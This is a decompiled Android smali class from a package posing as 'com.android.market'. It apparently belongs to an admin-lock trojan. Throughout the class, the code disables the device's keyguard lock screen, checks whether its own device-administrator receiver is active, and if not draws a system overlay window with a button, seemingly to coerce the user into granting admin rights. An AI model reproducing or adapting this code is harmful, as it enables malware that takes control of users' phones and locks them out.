.class public Lcom/android/market/e;
.super Landroid/os/AsyncTask;


# instance fields
.field a:Landroid/view/WindowManager;

.field b:Landroid/view/View;

.field c:Landroid/view/WindowManager$LayoutParams;

.field d:Landroid/view/View;

.field e:Z

.field f:Z

.field final synthetic g:Lcom/android/market/AdminX;


# direct methods
.method public constructor <init>(Lcom/android/market/AdminX;)V
    .locals 1

    const/4 v0, 0x0

    iput-object p1, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object v0, p0, Lcom/android/market/e;->a:Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/android/market/e;->b:Landroid/view/View;

    iput-object v0, p0, Lcom/android/market/e;->c:Landroid/view/WindowManager$LayoutParams;

    iput-object v0, p0, Lcom/android/market/e;->d:Landroid/view/View;

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/market/e;->e:Z

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/market/e;->f:Z

    return-void
.end method

.method static synthetic a(Lcom/android/market/e;)Lcom/android/market/AdminX;
    .locals 1

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    return-object v0
.end method


# virtual methods
.method protected varargs a([Ljava/lang/Void;)Ljava/lang/String;
    .locals 11

    const/high16 v10, 0x7f030000

    const/4 v9, 0x1

    const/4 v1, 0x0

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    const-string v2, "keyguard"

    invoke-virtual {v0, v2}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    const-string v2, "ANDROID"

    invoke-virtual {v0, v2}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    const-string v2, "device_policy"

    invoke-virtual {v0, v2}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iget-object v2, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    const-string v3, "window"

    invoke-virtual {v2, v3}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/WindowManager;

    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-virtual {v3}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v5, Lcom/android/market/AdminReceiver;

    invoke-direct {v2, v3, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_4

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-static {v0}, Lcom/android/market/AdminX;->a(Lcom/android/market/AdminX;)Landroid/view/WindowManager$LayoutParams;

    move-result-object v6

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-static {v0}, Lcom/android/market/AdminX;->b(Lcom/android/market/AdminX;)Landroid/view/WindowManager$LayoutParams;

    move-result-object v8

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    const-string v2, "layout_inflater"

    invoke-virtual {v0, v2}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/LayoutInflater;

    const v0, 0x7f030003

    invoke-virtual {v7, v0, v1}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v5

    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    iget-object v2, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-virtual {v2}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lcom/android/market/AdminX;->a(Landroid/content/Context;)Z

    move-result v2

    if-nez v2, :cond_0

    const/16 v2, 0xa

    if-le v0, v2, :cond_3

    const v0, 0x7f030002

    const/4 v2, 0x0

    invoke-virtual {v7, v0, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/android/market/e;->d:Landroid/view/View;

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/market/e;->f:Z

    :goto_0
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/market/e;->e:Z

    :cond_0
    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-virtual {v0}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/AdminX;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/high16 v0, 0x7f030000

    const/4 v2, 0x0

    invoke-virtual {v7, v0, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/android/market/e;->d:Landroid/view/View;

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/market/e;->f:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_1
    iget-boolean v0, p0, Lcom/android/market/e;->f:Z

    if-nez v0, :cond_2

    invoke-virtual {v7, v10, v1}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/android/market/e;->d:Landroid/view/View;

    :cond_2
    const v0, 0x7f070007

    invoke-virtual {v5, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Button;

    const v0, 0x7f070004

    invoke-virtual {v5, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    const v0, 0x7f050008

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(I)V

    iput-object v4, p0, Lcom/android/market/e;->a:Landroid/view/WindowManager;

    iput-object v5, p0, Lcom/android/market/e;->b:Landroid/view/View;

    iput-object v6, p0, Lcom/android/market/e;->c:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {v3, v9}, Landroid/widget/Button;->setEnabled(Z)V

    new-instance v0, Lcom/android/market/f;

    move-object v1, p0

    invoke-direct/range {v0 .. v8}, Lcom/android/market/f;-><init>(Lcom/android/market/e;Landroid/widget/TextView;Landroid/widget/Button;Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;Landroid/view/LayoutInflater;Landroid/view/WindowManager$LayoutParams;)V

    invoke-virtual {v3, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v0, "na"

    :goto_2
    return-object v0

    :cond_3
    const/high16 v0, 0x7f030000

    const/4 v2, 0x0

    :try_start_1
    invoke-virtual {v7, v0, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/android/market/e;->d:Landroid/view/View;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/market/e;->f:Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1

    :cond_4
    move-object v0, v1

    goto :goto_2
.end method

.method protected a(Ljava/lang/String;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    if-eqz p1, :cond_0

    const-string v0, "na"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/android/market/e;->a:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/android/market/e;->b:Landroid/view/View;

    iget-object v2, p0, Lcom/android/market/e;->c:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    iget-object v0, v0, Lcom/android/market/AdminX;->c:Landroid/os/Handler;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    iget-object v0, v0, Lcom/android/market/AdminX;->c:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    :cond_1
    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    const/4 v1, 0x1

    iput-boolean v1, v0, Lcom/android/market/AdminX;->b:Z

    iget-object v0, p0, Lcom/android/market/e;->g:Lcom/android/market/AdminX;

    invoke-virtual {v0}, Lcom/android/market/AdminX;->stopSelf()V

    goto :goto_0
.end method

.method protected varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/android/market/e;->a([Ljava/lang/Void;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/market/e;->a(Ljava/lang/String;)V

    return-void
.end method
